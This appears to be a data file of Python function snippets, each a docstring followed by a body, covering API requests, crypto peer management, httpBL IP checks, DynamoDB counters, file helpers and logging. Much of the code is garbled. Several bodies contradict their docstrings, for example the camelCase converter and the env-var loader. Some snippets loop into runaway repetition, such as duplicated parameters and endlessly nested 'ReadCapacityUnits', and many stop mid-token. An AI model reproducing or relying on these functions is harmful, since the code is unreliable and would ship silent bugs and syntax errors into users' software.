        "def post(self, url, params=None, files=None):\n        \"\"\"\n        Issues a POST request against the API, allows for multipart data uploads\n\n        :param url: a string, the url you are requesting\n        :param params: a dict, the key-value of all the parameters needed\n                       in the request\n        :param files: a list, the list of tuples of files\n\n        :returns: a dict parsed of the JSON response\n        \"\"\"\n        if files is None:\n            files = []\n        if params is None:\n            params = {}\n        if isinstance(files, (list, tuple)):\n            files = [(f[0], f[1]) for f in files]\n        return self._request(url, 'POST', params, files)",
        "def _load_env_vars(self):\n        \"\"\"\n        Go through the env var map, transferring the values to this object\n        as attributes.\n\n        :raises: RuntimeError if a required env var isn't defined.\n        \"\"\"\n        for key, value in self.env_vars.items():\n            if key not in self.required_env_vars:\n                raise RuntimeError(\n                    \"Required env var %s not defined\" % key)\n            setattr(self, key, value)",
        "def create_temp_dir(module_name):\n    \"\"\"Create a temporary directory with input data for the test.\n    The directory contents is copied from a directory with the same name as the module located in the same directory of\n    the test module.\"\"\"\n    temp_dir = tempfile.mkdtemp()\n    os.chdir(temp_dir)\n    return temp_dir",
        "def compare_files(self, obtained_fn, expected_fn, binary=False, encoding=None, fix_callback=None,\n                      binary_encoding=None, fix_callback_encoding=None,\n                      fix_callback_encoding_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n                      fix_callback_encoding_callback_callback=None,\n",
        "def diff_files(self, *files):\n        \"\"\"\n        Returns a nice side-by-side diff of the given files, as a string.\n        \"\"\"\n        diff = self.diff(*files)\n        return '\\n'.join(diff)",
        "def add_peer(self, peer):\n        \"\"\"\n        Add a peer or multiple peers to the PEERS variable, takes a single string or a list.\n\n        :param peer(list or string)\n        \"\"\"\n        if isinstance(peer, str):\n            peer = [peer]\n        self.PEERS.extend(peer)",
        "def remove_peer(self, peer):\n        \"\"\"\n        remove one or multiple peers from PEERS variable\n\n        :param peer(list or string):\n        \"\"\"\n        if isinstance(peer, str):\n            peer = [peer]\n        for peer in peer:\n            if peer in self.PEERS:\n                del self.PEERS[peer]",
        "def check_status(self):\n        \"\"\"\n        check the status of the network and the peers\n\n        :return: network_height, peer_status\n        \"\"\"\n        network_height = self.network.get_height()\n        peer_status = self.peer_manager.get_peer_status()\n        return network_height, peer_status",
        "def broadcast_tx(self, tx_hex):\n        \"\"\"broadcasts a transaction to the peerslist using ark-js library\"\"\"\n        tx_hex = tx_hex.encode('hex')\n        tx_hash = self.get_tx_hash(tx_hex)\n        if tx_hash in self.peers:\n            self.peers[tx_hash].broadcast(tx_hex)",
        "def expose(self, service):\n        \"\"\"Exposes a given service to this API.\"\"\"\n        if not isinstance(service, Service):\n            raise TypeError(\"Service must be an instance of Service\")\n        self._exposes.append(service)",
        "def main(argv=None):\n    \"\"\"Main entry point, expects doctopt arg dict as argd.\"\"\"\n    args = doctopt.docopt(__doc__, argv=argv)\n    if args['--version']:\n        print(__version__)\n        return\n    if args['--version']:\n        print(__version__)\n        return\n    if args['--version']:\n        print(__version__)\n        return\n    if args['<module>']:\n        module = args['<module>']\n        if not args['<module>'].startswith('.'):\n            module = '.' + module\n        if not args['<module>'].endswith('.py'):\n            module = '.' + module + '.py'\n        if not args['<module>'].endswith('.pyc'):\n            module = '.' + module + '.py",
        "def debug(msg, *args, **kwargs):\n    \"\"\"Print a message only if DEBUG is truthy.\"\"\"\n    if not DEBUG:\n        return\n    if not args:\n        return\n    if not kwargs:\n        return\n    if not isinstance(args[0], str):\n        args = args[0]\n    if not isinstance(kwargs[0], str):\n        kwargs = kwargs[0]\n    if not args or not kwargs:\n        return\n    print(msg, *args, **kwargs)",
        "def parse_int(self, s):\n        \"\"\"\n        Parse a string as an integer.\n        Exit with a message on failure.\n        \"\"\"\n        try:\n            return int(s)\n        except ValueError:\n            self.log.error(\"Could not parse %s as an integer\", s)\n            sys.exit(1)",
        "def read_file(self, s):\n        \"\"\"\n        If `s` is a file name, read the file and return it's content.\n        Otherwise, return the original string.\n        Returns None if the file was opened, but errored during reading.\n        \"\"\"\n        if isinstance(s, str):\n            return self.read_file_string(s)\n        else:\n            return s",
        "def wait(self, timeout=None):\n        \"\"\"\n        Wait for response until timeout.\n        If timeout is specified to None, ``self.timeout`` is used.\n\n        :param float timeout: seconds to wait I/O\n        \"\"\"\n        if timeout is None:\n            timeout = self.timeout\n        if timeout is None:\n            return self._wait_io()\n        return self._wait_io(timeout)",
        "def get_archive_temp(file_obj):\n    \"\"\"\n    If the file-object is not seekable, return  ArchiveTemp of the fileobject,\n    otherwise return the file-object itself\n    \"\"\"\n    if not file_obj.seekable():\n        return ArchiveTemp(file_obj)\n    return file_obj",
        "def setup_tracing(self):\n        \"\"\"Setup before_request, after_request handlers for tracing.\"\"\"\n        self.before_request = self.before_request_handler\n        self.after_request = self.after_request_handler\n        self.before_request.add_handler(self.before_request_handler)\n        self.after_request.add_handler(self.after_request_handler)",
        "def start(self):\n        \"\"\"Records the starting time of this reqeust.\"\"\"\n        self.start_time = time.time()\n        self.start_time_ns = self.start_time * 1e9",
        "def _add_transaction_id(self, request):\n        \"\"\"Calculates the request duration, and adds a transaction\n        ID to the header.\n        \"\"\"\n        if self.transaction_id is None:\n            self.transaction_id = request.META.get('HTTP_X_TRANSACTION_ID')\n        return self.transaction_id",
        "def _insert_spaces(words, width):\n    \"\"\"Insert spaces between words until it is wide enough for `width`.\"\"\"\n    for word in words:\n        if len(word) > width:\n            yield word.ljust(width - len(word))",
        "def _append_lines(self, text):\n        \"\"\"Prepend or append text to lines. Yields each line.\"\"\"\n        if not text:\n            return\n        if self.lines:\n            yield ''.join(self.lines)\n        self.lines = text.splitlines()",
        "def _format_block(self, block):\n        \"\"\"Format block by splitting on individual characters.\"\"\"\n        lines = block.split('\\n')\n        for line in lines:\n            line = line.strip()\n            if line:\n                yield line",
        "def _format_block(self, block):\n        \"\"\"Format block by wrapping on spaces.\"\"\"\n        if block.text:\n            return self._wrap_text(block.text)\n        else:\n            return ''",
        "def _remove_spaces(self, width):\n        \"\"\"Remove spaces in between words until it is small enough for\n            `width`.\n            This will always leave at least one space between words,\n            so it may not be able to get below `width` characters.\n        \"\"\"\n        words = self.text.split()\n        for word in words:\n            if len(word) > width:\n                self.text = word[:width - 3] + ' ' + word[width - 3:]",
        "def check_ip(self, ip):\n        \"\"\"\n        Check IP trough the httpBL API\n\n        :param ip: ipv4 ip address\n        :return: httpBL results or None if any error is occurred\n        \"\"\"\n        try:\n            return self.httpbl.check_ip(ip)\n        except Exception as e:\n            self.log.exception(e)\n            return None",
        "def is_threat(self, result=None, harmless_age=None, threat_score=None, threat_type=None):\n        \"\"\"\n        Check if IP is a threat\n\n        :param result: httpBL results; if None, then results from last check_ip() used (optional)\n        :param harmless_age: harmless age for check if httpBL age is older (optional)\n        :param threat_score: threat score for check if httpBL threat is lower (optional)\n        :param threat_type:  threat type, if not equal httpBL score type, then return False (optional)\n        :return: True or False\n        \"\"\"\n        if result is None:\n            result = self.check_ip(harmless_age=harmless_age, threat_score=threat_score",
        "def is_ip_suspicious(self, result=None):\n        \"\"\"\n        Check if IP is suspicious\n\n        :param result: httpBL results; if None, then results from last check_ip() used (optional)\n        :return: True or False\n        \"\"\"\n        if result is None:\n            result = self.check_ip()\n        return result.get('suspicious')",
        "def invalidate_httpBL_cache(self, ip):\n        \"\"\"\n        Invalidate httpBL cache for IP address\n\n        :param ip: ipv4 IP address\n        \"\"\"\n        self.httpBL_cache.invalidate(ip)\n        self.httpBL_cache.invalidate(ip + '/v4')",
        "def invalidate_httpBL_cache(self):\n        \"\"\"Invalidate httpBL cache\"\"\"\n        self.httpBL_cache = {}\n        self.httpBL_cache_path = None\n        self.httpBL_cache_path_cache = None\n        self.httpBL_cache_path_cache_path = None",
        "def run(self):\n        \"\"\"Runs the consumer.\"\"\"\n        self.logger.info(\"Starting the consumer\")\n        self.consumer = self.client.consumer(\n            self.queue,\n            callback=self.callback,\n            consumer_tag=self.consumer_tag,\n            consumer_tag_prefix=self.consumer_tag_prefix,\n            max_messages=self.max_messages,\n            max_message_size=self.max_message_size,\n            max_message_age=self.max_message_age,\n            auto_ack=self.auto_ack,\n            auto_ack_timeout=self.auto_ack_timeout,\n            auto_ack_max_age=self.auto_ack_max_age,\n            auto_ack_max_delay=self.auto_ack_max_delay,\n            auto_ack_max_",
        "def _upload_next_batch(self, items):\n        \"\"\"Upload the next batch of items, return whether successful.\"\"\"\n        if self._upload_batch_size == 0:\n            return False\n        if self._upload_batch_size == 1:\n            return self._upload_batch(items[0])\n        return self._upload_batch(items)",
        "def _next_batch(self):\n        \"\"\"Return the next batch of items to upload.\"\"\"\n        if self._batch_size is None:\n            self._batch_size = self._max_batch_size\n        if self._batch_size == 0:\n            return\n        batch = self._client.list_batch(self._batch_size)\n        self._batch_size -= 1\n        return batch",
        "def get(self):\n        \"\"\"Get a single item from the queue.\"\"\"\n        if self.queue:\n            return self.queue.popleft()\n        else:\n            return None",
        "def _upload_batch(self, batch):\n        \"\"\"Attempt to upload the batch and retry before raising an error\"\"\"\n        try:\n            self.client.upload_batch(self.bucket, self.key, batch)\n        except ClientError as e:\n            if e.response['Error']['Code'] == 'NoSuchKey':\n                self.log.info('Batch %s does not exist', self.key)\n            else:\n                raise",
        "def _camelcase_to_underscore(name):\n    \"\"\"Translate camelCase into underscore format.\n\n    >>> _camelcase_to_underscore('minutesBetweenSummaries')\n    'minutes_between_summaries'\n    \"\"\"\n    parts = name.split('_')\n    return '_'.join(parts[:-1]) + '_' + parts[-1]",
        "def create_tree(endpoints):\n    \"\"\"Creates the Trello endpoint tree.\n\n    >>> r = {'1': { \\\n                 'actions': {'METHODS': {'GET'}}, \\\n                 'boards': { \\\n                     'members': {'METHODS': {'DELETE'}}}} \\\n            }\n    >>> r == create_tree([ \\\n                 'GET /1/actions/[idAction]', \\\n                 'DELETE /1/boards/[board_id]/members/[idMember]'])\n    True\n    \"\"\"\n    r = {}\n    for endpoint in endpoints:\n        r[endpoint] = {}\n        for key in endpoint:\n            r[endpoint][key] = {}\n            for subkey in endpoint[key]:\n                r[endpoint][key][subkey] = {}\n                for subsubkey in subkey:\n                    r[endpoint][key][sub",
        "def print_yaml(self):\n        \"\"\"Prints the complete YAML.\"\"\"\n        print(\"---\")\n        print(\"--- YAML\")\n        print(\"---\")\n        print(\"{\")\n        for section in self.sections:\n            print(\"{0:s}: {1}\".format(section, self.get(section)))\n        print(\"}\")",
        "def _wql_connect(self):\n        \"\"\"Connect by wmi and run wql.\"\"\"\n        try:\n            self.wmi = wmi.WMI(self.host, self.user, self.password)\n            self.wql = wql.WQL(self.wmi)\n        except Exception as e:\n            raise Exception(\"Failed to connect to wmi: %s\" % e)",
        "def log(self, level, message, *args, **kwargs):\n        \"\"\"\n        Wrapper for the other log methods, decide which one based on the\n        URL parameter.\n        \"\"\"\n        if self.url_params:\n            if level == 'debug':\n                return self.debug(message, *args, **kwargs)\n            elif level == 'info':\n                return self.info(message, *args, **kwargs)\n            elif level == 'warning':\n                return self.warning(message, *args, **kwargs)\n            elif level == 'error':\n                return self.error(message, *args, **kwargs)\n            else:\n                return self.error(message, *args, **kwargs)\n        else:\n            return self.log(level, message, *args, **kwargs)",
        "def log(self, level, message, *args, **kwargs):\n        \"\"\"Write to a local log file\"\"\"\n        if self.log_file:\n            with open(self.log_file, 'a') as f:\n                f.write(message)\n        return self",
        "def write_to_remote_host(self, remote_host, data):\n        \"\"\"Write to a remote host via HTTP POST\"\"\"\n        return self.http_post(remote_host, data, self.remote_host_timeout)",
        "def _store_credentials(self, username, password):\n        \"\"\"Helper method to store username and password\"\"\"\n        self.username = username\n        self.password = password",
        "def set_connection_params(self, host, port, username, password,\n                               database, ssl, ssl_verify, ssl_cert):\n        \"\"\"Set connection parameters. Call set_connection with no arguments to clear.\"\"\"\n        self.set_connection(host, port, username, password,\n                           database, ssl, ssl_verify, ssl_cert)",
        "def set_delegate_params(self, delegate_id, delegate_type, delegate_name, delegate_params):\n        \"\"\"Set delegate parameters. Call set_delegate with no arguments to clear.\"\"\"\n        self.set_delegate(delegate_id, delegate_type, delegate_name, None)\n        self.set_delegate_params(delegate_id, delegate_type, delegate_name, None)",
        "def get_balance(self, address):\n        \"\"\"Takes a single address and returns the current balance.\"\"\"\n        return self.get_raw_transaction(\n            self.get_balance_address(address),\n            from_block=self.get_block_number(address),\n            to_block=self.get_block_number(address)\n        )",
        "def get_block_rewards(self):\n        \"\"\"\n        returns a list of named tuples,  x.timestamp, x.amount including block rewards\n        \"\"\"\n        return [(x.timestamp, x.amount) for x in self.get_block_rewards_raw()]",
        "def _massage_bool(config_val, evar):\n    \"\"\"Massages the 'true' and 'false' strings to bool equivalents.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :rtype: bool\n    :return: True or False, depending on the value.\n    \"\"\"\n    if config_val == 'true':\n        return True\n    elif config_val == 'false':\n        return False\n    else:\n        raise ValueError('Invalid value for %s: %s' % (evar.name, config_val))",
        "def validate_env_var_value(config_val, evar):\n    \"\"\"If the value is ``None``, fail validation.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :raises: ValueError if the config value is None.\n    \"\"\"\n    if config_val is None:\n        raise ValueError('The value of the env var is None.')",
        "def validate_boolean(config_val, evar):\n    \"\"\"Make sure the value evaluates to boolean True.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :raises: ValueError if the config value evaluates to boolean False.\n    \"\"\"\n    if config_val is None:\n        return\n    if config_val == 'true':\n        return\n    if config_val == 'false':\n        raise ValueError('Config value %s is false' % config_val)",
        "def _evar_to_level(config_val, evar):\n    \"\"\"Convert an evar value into a Python logging level constant.\n\n    :param str config_val: The env var value.\n    :param EnvironmentVariable evar: The EVar object we are validating\n        a value for.\n    :return: A validated string.\n    :raises: ValueError if the log level is invalid.\n    \"\"\"\n    if config_val is None:\n        return logging.WARNING\n    elif isinstance(config_val, six.string_types):\n        return logging.WARNING\n    elif isinstance(config_val, six.integer_types):\n        return logging.WARNING\n    elif isinstance(config_val, bool):\n        return logging.WARNING\n    elif isinstance(config_val, six.integer_types):\n        return logging.WARNING\n    elif isinstance(config_val,",
        "def register_range_type(pgrange, intrange, conn):\n    \"\"\"Register a new range type as a PostgreSQL range.\n\n        >>> register_range_type(\"int4range\", intrange, conn)\n\n    The above will make sure intrange is regarded as an int4range for queries\n    and that int4ranges will be cast into intrange when fetching rows.\n\n    pgrange should be the full name including schema for the custom range type.\n\n    Note that adaption is global, meaning if a range type is passed to a regular\n    psycopg2 connection it will adapt it to its proper range type. Parsing of\n    rows from the database however is not global and just set on a per connection\n    basis.\n    \"\"\"\n    if not isinstance(intrange, int):\n        raise ValueError(\"intrange must be an int\")\n    if not isinstance",
        "def _get_error(response):\n  \"\"\"Acquires the correct error for a given response.\n\n  :param requests.Response response: HTTP error response\n  :returns: the appropriate error for a given response\n  :rtype: APIError\n  \"\"\"\n  if response.status_code == 404:\n    return APIError(\n        'The requested resource does not exist.',\n        response.content,\n        response.status_code)\n  elif response.status_code == 429:\n    return APIError(\n        'Too many requests.',\n        response.content,\n        response.status_code)\n  elif response.status_code == 500:\n    return APIError(\n        'Internal server error.',\n        response.content,\n        response.status_code)\n  else:\n    return APIError(\n        'Unexpected error.',\n        response.",
        "def request_to_python(request):\n    \"\"\"\n    Converts the request parameters to Python.\n\n    :param request: <pyramid.request.Request> || <dict>\n\n    :return: <dict>\n    \"\"\"\n    if isinstance(request, Request):\n        request = request.request\n    return {k: v for k, v in request.params.items() if k in request.request.GET}",
        "def extract_orb_context(request, model=None):\n    \"\"\"\n    Extracts ORB context information from the request.\n\n    :param request: <pyramid.request.Request>\n    :param model: <orb.Model> || None\n\n    :return: {<str> key: <variant> value} values, <orb.Context>\n    \"\"\"\n    if model is None:\n        model = orb.get_model(request)\n\n    context = orb.Context(model)\n    return context.get_context()",
        "def _handle_order_book_update(self, order_book):\n        \"\"\"Handles real-time updates to the order book.\"\"\"\n        if order_book is None:\n            return\n        if self._order_book_update_callback is not None:\n            self._order_book_update_callback(order_book)",
        "def _keep_alive(self):\n        \"\"\"Used exclusively as a thread which keeps the WebSocket alive.\"\"\"\n        while self._alive:\n            try:\n                self._socket.recv_until(b'\\r\\n', timeout=1)\n            except socket.timeout:\n                self._socket.close()\n                self._socket = None\n                break",
        "def connect(self):\n        \"\"\"Connects and subscribes to the WebSocket Feed.\"\"\"\n        self.ws = websockets.WebSocketApp(self.url)\n        self.ws.connect(self.url)\n        self.ws.on_message = self.on_message\n        self.ws.on_close = self.on_close",
        "def exempt(self, view_func):\n        \"\"\"Marks a view function as being exempt from the cached httpbl view protection.\"\"\"\n        if view_func not in self._exempt_views:\n            self._exempt_views.append(view_func)",
        "def get_connection(self, region=None, key=None, keyid=None, profile=None):\n        \"\"\"\n        Hook point for overriding how the CounterPool gets its connection to\n        AWS.\n        \"\"\"\n        if not self.connection:\n            self.connection = self.get_connection_from_region(region, key, keyid, profile)\n        return self.connection",
        "def _get_schema(self, table_name):\n        \"\"\"\n        Hook point for overriding how the CounterPool determines the schema\n        to be used when creating a missing table.\n        \"\"\"\n        schema = self.schema\n        if schema is None:\n            schema = self.default_schema\n        return schema",
        "def create_table(self, table_name, columns=None, **kwargs):\n        \"\"\"\n        Hook point for overriding how the CounterPool creates a new table\n        in DynamooDB\n        \"\"\"\n        if not columns:\n            columns = self.columns\n        return self.dynamodb.create_table(\n            TableName=table_name,\n            KeySchema=[\n                {\n                    'AttributeName': 'id',\n                    'KeyType': 'HASH'\n                }\n            ],\n            ProvisionedThroughput = {\n                'ReadCapacityUnits': {\n                    'ReadCapacityUnits': {\n                        'ReadCapacityUnits': {\n                            'ReadCapacityUnits': {\n                                'ReadCapacityUnits': {\n                                    'ReadCapacityUnits': {\n                                        'ReadCapacityUnits': {\n                                            'ReadCapacityUnits': {\n                                                'ReadCapacityUnits': {\n                                                    'ReadCapacity",
        "def _get_table(self, table_name):\n        \"\"\"\n        Hook point for overriding how the CounterPool transforms table_name\n        into a boto DynamoDB Table object.\n        \"\"\"\n        table = self.table_class(self.connection, table_name)\n        table.create_table(self.table_attributes)\n        return table",
        "def create_item(self, counter, item):\n        \"\"\"\n        Hook point for overriding how the CouterPool creates a DynamoDB item\n        for a given counter when an existing item can't be found.\n        \"\"\"\n        if not self.table_exists(counter):\n            self.table.create_table(\n                KeySchema=[\n                    {\n                        'AttributeName': 'counter',\n                        'KeyType': 'HASH'\n                    },\n                    {\n                        'AttributeName': 'item',\n                        'KeyType': 'S'\n                    }\n                ],\n                ProvisionedThroughput = {\n                    'ReadCapacityUnits': 1,\n                    'WriteCapacityUnits': 1,\n                    'ProvisionedThroughput': {\n                        'ReadCapacityUnits': 1,\n                        'WriteCapacityUnits': 1\n                    }\n                }\n            )\n        return item",
        "def fetch_item(self, counter):\n        \"\"\"\n        Hook point for overriding how the CouterPool fetches a DynamoDB item\n        for a given counter.\n        \"\"\"\n        item = self.table.get_item(\n            Key={'counter': counter})\n        if item:\n            return item\n        else:\n            return None",
        "def _get_item_from_counter(self, counter_name):\n        \"\"\"\n        Gets the DynamoDB item behind a counter and ties it to a Counter\n        instace.\n        \"\"\"\n        counter = self.dynamodb.get_counter(CounterName=counter_name)\n        item = counter.get_item()\n        self._set_counter_value(counter_name, item)\n        return item",
        "def _build_many_to_one_relationship(\n        event: Event,\n        class_: Type[BaseEntity],\n        remote_table: Type[BaseEntity],\n) -> None:\n    \"\"\"Use an event to build a many-to-one relationship on a class.\n\n    This makes use of the :meth:`.References._reference_table` method\n    to generate a full foreign key relationship to the remote table.\n    \"\"\"\n    if not hasattr(class_, '_references'):\n        return\n\n    for remote_field in class_._references.get(remote_table, []):\n        if remote_field.field.name == 'id':\n            continue\n\n        if remote_field.field.name not in event.related_fields:\n            continue\n\n        if remote_field.field.name == 'id':\n            continue\n\n        if remote",
        "def _build_one_to_many_relationship(\n        event: Event,\n        class_: Type[BaseEntity],\n        remote_table: Type[BaseEntity],\n) -> None:\n    \"\"\"Use an event to build a one-to-many relationship on a class.\n\n    This makes use of the :meth:`.References._reference_table` method\n    to generate a full foreign key relationship from the remote table.\n    \"\"\"\n    if not isinstance(remote_table, BaseEntity):\n        return\n\n    if not hasattr(remote_table, '_reference_table'):\n        return\n\n    remote_table._reference_table(class_)",
        "def _djeffify_data(self, data):\n        \"\"\"Djeffify data between tags\"\"\"\n        if self.djeffify_data:\n            return self.djeffify_data(data)\n        else:\n            return data",
        "def _add_foreign_key_to_class(self, local_class, remote_table):\n        \"\"\"Create a foreign key reference from the local class to the given remote\n        table.\n\n        Adds column references to the declarative class and adds a\n        ForeignKeyConstraint.\n        \"\"\"\n        local_table = self._get_table_name(local_class)\n        remote_table = self._get_table_name(remote_table)\n        self._add_column_references(local_class, remote_table)\n        self._add_foreign_key_constraint(\n            local_class, remote_table, 'fkey', 'fk', 'c', 'f', 'r', 'c',\n            'fkey_foreign', 'fk_foreign', 'c_foreign', 'r_foreign', 'c_foreign',\n            'fkey_local', 'fk",
        "def path_join(*paths):\n    \"\"\"Path join helper method\n    Join paths if list passed\n\n    :type path: str|unicode|list\n    :rtype: str|unicode\n    \"\"\"\n    if isinstance(paths, str):\n        return os.path.join(paths)\n    elif isinstance(paths, list):\n        return os.path.join(*paths)\n    else:\n        raise ValueError(\"Path must be a string or list\")",
        "def read_file(file_path, encoding=None):\n    \"\"\"Read helper method\n\n    :type file_path: str|unicode\n    :type encoding: str|unicode\n    :rtype: str|unicode\n    \"\"\"\n    with open(file_path, encoding=encoding) as f:\n        return f.read()",
        "def write_file(file_path, contents, encoding=None):\n    \"\"\"Write helper method\n\n    :type file_path: str|unicode\n    :type contents: str|unicode\n    :type encoding: str|unicode\n    \"\"\"\n    with open(file_path, 'w', encoding=encoding) as f:\n        f.write(contents)",
        "def copy_file(src, dest):\n    \"\"\"Copy file helper method\n\n    :type src: str|unicode\n    :type dest: str|unicode\n    \"\"\"\n    if not os.path.exists(dest):\n        os.makedirs(dest)\n    with open(src, 'rb') as f:\n        shutil.copyfileobj(f, open(dest, 'wb'))",
        "def split_path(path):\n    \"\"\"Split file name and extension\n\n    :type path: str|unicode\n    :rtype: one str|unicode\n    \"\"\"\n    path = path.strip()\n    if not path:\n        return None\n    path = path.lower()\n    if path.endswith('.gz'):\n        path = path[:-3]\n    return path",
        "def _split_path(path):\n        \"\"\"\n        Helper method for absolute and relative paths resolution\n        Split passed path and return each directory parts\n\n        example: \"/usr/share/dir\"\n        return: [\"usr\", \"share\", \"dir\"]\n\n        @type path: one of (unicode, str)\n        @rtype: list\n        \"\"\"\n        if isinstance(path, unicode):\n            path = path.encode(\"utf-8\")\n        return [os.path.abspath(p) for p in path.split(os.pathsep)]",
        "def _make_endpoint_uri(parts):\n    \"\"\"Creates fully qualified endpoint URIs.\n\n    :param parts: the string parts that form the request URI\n    \"\"\"\n    endpoint_uri = parts[0]\n    if len(parts) > 1:\n        endpoint_uri = endpoint_uri + '/' + parts[1]\n    return endpoint_uri",
        "def _format_time(time):\n    \"\"\"Makes sure we have proper ISO 8601 time.\n\n    :param time: either already ISO 8601 a string or datetime.datetime\n    :returns: ISO 8601 time\n    :rtype: str\n    \"\"\"\n    if isinstance(time, str):\n        time = time.replace('T', ' ')\n        time = time.replace('Z', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time.replace('+00:00', ' ')\n        time = time",
        "def _handle_response(response):\n    \"\"\"Returns the given response or raises an APIError for non-2xx responses.\n\n    :param requests.Response response: HTTP response\n    :returns: requested data\n    :rtype: requests.Response\n    :raises APIError: for non-2xx responses\n    \"\"\"\n    if response.status_code != 200:\n        raise APIError(response.status_code, response.text)\n    return response.json()",
        "def _next_message(self):\n    \"\"\"Checks if a next message is possible.\n\n    :returns: True if a next message is possible, otherwise False\n    :rtype: bool\n    \"\"\"\n    if self._next_message_index < len(self._messages):\n      return self._messages[self._next_message_index].is_complete()\n    else:\n      return False",
        "def color(text, code, format):\n    \"\"\"Colors text with code and given format\"\"\"\n    if not isinstance(text, str):\n        text = str(text)\n    if not isinstance(code, str):\n        code = str(code)\n    if not isinstance(format, str):\n        format = str(format)\n    return color_text(text, code, format)",
        "def RegisterMessage(self, message):\n    \"\"\"Registers the given message type in the local database.\n\n    Args:\n      message: a message.Message, to be registered.\n\n    Returns:\n      The provided message.\n    \"\"\"\n    if message.type_id not in self._message_types:\n      self._message_types[message.type_id] = message\n      return message\n\n    # If the message type is already registered, we just return it.\n    if message.type_id in self._message_types:\n      return self._message_types[message.type_id]\n\n    # Otherwise, we need to create a new message type.\n    message_type = message.CreateMessageType()\n    self._message_types[message.type_id] = message\n    return message_type",
        "def insert(self, index, value):\n        \"\"\"Insert object before index.\n\n        :param int index: index to insert in\n        :param string value: path to insert\n        \"\"\"\n        if index < 0:\n            raise ValueError(\"index must be greater than 0\")\n        if index > len(self):\n            raise ValueError(\"index must be less than length of object\")\n        self.objects.insert(index, value)",
        "def _parse_runtime_paths(self, string):\n        \"\"\"Parse runtime path representation to list.\n\n        :param string string: runtime path string\n        :return: list of runtime paths\n        :rtype: list of string\n        \"\"\"\n        if not string:\n            return []\n        if not isinstance(string, list):\n            string = [string]\n        return string",
        "def add_bundle(self, bundle):\n        \"\"\"\n        Add some bundle to build group\n\n        :type bundle: static_bundle.bundles.AbstractBundle\n        @rtype: BuildGroup\n        \"\"\"\n        if bundle.name in self.bundles:\n            raise BundleAlreadyAddedError(bundle.name)\n        self.bundles[bundle.name] = bundle\n        return self",
        "def files_links(self):\n        \"\"\"Return collected files links\n\n        :rtype: list[static_bundle.files.StaticFileResult]\n        \"\"\"\n        return [\n            StaticFileResult(\n                static_file_id=file_id,\n                static_file_path=file_path,\n                static_file_type=file_type,\n                static_file_size=file_size,\n                static_file_last_modified=file_last_modified,\n                static_file_last_access=file_last_access,\n            )\n            for file_id, file_path, file_type, file_size, file_last_modified, file_last_access in self.files\n        ]",
        "def minifier(self):\n        \"\"\"\n        Asset minifier\n        Uses default minifier in bundle if it's not defined\n\n        :rtype: static_bundle.minifiers.DefaultMinifier|None\n        \"\"\"\n        if self._minifier is None:\n            self._minifier = self.bundle.minifiers.get(self.asset_type)\n        return self._minifier",
        "def render_includes(self, name):\n        \"\"\"Render all includes in asset by names\n\n        :type name: str|unicode\n        :rtype: str|unicode\n        \"\"\"\n        if not isinstance(name, str):\n            raise TypeError(\"name must be a string\")\n        return self._asset_includes.get(name, self._asset_includes.get(name, ''))",
        "def get_links(self):\n        \"\"\"Return links without build files\"\"\"\n        links = []\n        for link in self.links:\n            if link.is_build:\n                continue\n            if link.is_file:\n                links.append(link)\n        return links",
        "def coerce_to_string(obj, default_date_fmt=None):\n    \"\"\"Coerce everything to strings.\n    All objects representing time get output according to default_date_fmt.\n    \"\"\"\n    if isinstance(obj, datetime):\n        return obj.strftime(default_date_fmt)\n    elif isinstance(obj, date):\n        return obj.strftime(default_date_fmt)\n    elif isinstance(obj, datetime.date):\n        return obj.strftime(default_date_fmt)\n    elif isinstance(obj, datetime.time):\n        return obj.strftime(default_date_fmt)\n    elif isinstance(obj, datetime.datetime):\n        return obj.strftime(default_date_fmt)\n    elif isinstance(obj, datetime.timedelta):\n        return obj.strftime(default_date_fmt)\n    elif isinstance(obj,",
        "def init_logger(path, target, logger_name='root', level=logging.DEBUG,\n                maxBytes=1 * 1024 * 1024, backupCount=5,\n                application_name='', server_hostname='',\n                fields=None):\n    \"\"\"Initialize the zlogger.\n\n    Sets up a rotating file handler to the specified path and file with\n    the given size and backup count limits, sets the default\n    application_name, server_hostname, and default/whitelist fields.\n\n    :param path: path to write the log file\n    :param target: name of the log file\n    :param logger_name: name of the logger (defaults to root)\n    :param level: log level for this logger (defaults to logging.DEBUG)\n    :param maxBytes: size of the file before rotation (default 1MB)\n    :param application_name: app name to add",
        "def format(self, record):\n        \"\"\"\n        formats a logging.Record into a standard json log entry\n\n        :param record: record to be formatted\n        :type record: logging.Record\n        :return: the formatted json string\n        :rtype: string\n        \"\"\"\n        record_dict = {\n            'level': record.levelno,\n            'name': record.name,\n            'levelname': record.levelname,\n            'message': record.message,\n            'lineno': record.lineno,\n            'pathname': record.pathname,\n            'funcName': record.funcName,\n            'module': record.module,\n            'process': record.process,\n            'thread': record.thread,\n            'created': record.created,\n            'msecs': record.msecs,\n            'threadName': record.threadName,\n            'threadId",
        "def setup_model(app):\n    \"\"\"Initialize the model for a Pyramid app.\n\n    Activate this setup using ``config.include('baka_model')``.\n    \"\"\"\n    from baka.models import BakaModel\n    app.config.setdefault('baka_model', BakaModel)",
        "def _get_file_path(self, root_path, file_name, input_dir):\n        \"\"\"Return absolute and relative path for file\n\n        :type root_path: str|unicode\n        :type file_name: str|unicode\n        :type input_dir: str|unicode\n        :rtype: tuple\n        \"\"\"\n        return os.path.join(root_path, file_name), os.path.relpath(\n            os.path.join(input_dir, file_name), root_path)",
